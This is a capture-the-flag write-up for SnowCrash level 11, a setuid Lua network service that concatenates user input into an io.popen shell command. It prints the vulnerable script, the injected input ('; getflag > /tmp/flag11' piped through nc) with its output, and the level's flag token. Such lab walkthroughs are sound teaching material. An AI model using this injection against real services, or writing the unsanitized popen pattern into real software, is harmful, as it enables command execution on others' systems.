# 🔐 Level 11

> **Category:** Lua Command Injection  
> **Difficulty:** ⭐⭐⭐☆☆  
> **Key Technique:** Shell command injection via io.popen()

---

## 📋 Overview

A Lua script runs a network service that passes user input directly to a shell command, allowing command injection.

---

## 🔍 Reconnaissance

### Initial Discovery

```bash
level11@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
```

### Analyzing the Script

```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()
  data = string.sub(data, 1, 40)
  return data
end

while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end
  end
  client:close()
end
```

---

## 💡 Vulnerability Analysis

The `hash()` function uses `io.popen()` to execute a shell command:

```lua
prog = io.popen("echo "..pass.." | sha1sum", "r")
```

> [!CAUTION]
> User input is concatenated directly into the command string. By injecting shell metacharacters, we can execute arbitrary commands.

---

## 🎯 Exploitation

### Exploiting with Command Injection

```bash
# Inject command that redirects getflag output to a file
level11@SnowCrash:~$ echo '; getflag > /tmp/flag11' | nc localhost 5151; cat /tmp/flag11
Password: Erf nope..
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

> [!TIP]
> The semicolon `;` terminates the `echo` command, and `>` redirects output to a file (bypassing the pipe to sha1sum).

---

## ✅ Flag

| Item | Value |
|------|-------|
| Token | `fa6v5ateaw21peobuub8ipe6s` |

---

## 📚 References

- [Lua io.popen()](https://www.lua.org/manual/5.3/manual.html#pdf-io.popen)
- [Command Injection - OWASP](https://owasp.org/www-community/attacks/Command_Injection)